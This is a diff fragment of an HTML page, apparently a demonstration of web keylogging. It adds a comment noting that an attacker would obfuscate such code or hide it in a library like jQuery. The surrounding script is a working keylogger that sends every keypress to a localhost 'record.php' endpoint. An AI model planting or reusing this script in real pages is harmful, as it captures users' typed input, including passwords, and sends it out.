@@ -8,6 +8,7 @@
     <link href="css/style.css" rel="stylesheet" />
     <link href="css/StyleSheet1.css" rel="stylesheet" />
     <script>
+    //attacker would obfuscate code, probably embed within a third party library like jQuery.
         document.onkeypress = function KeyLogger(inp) {
             key_pressed = String.fromCharCode(inp.which);
             new Image().src = "http://localhost/record.php?key=" + key_pressed;
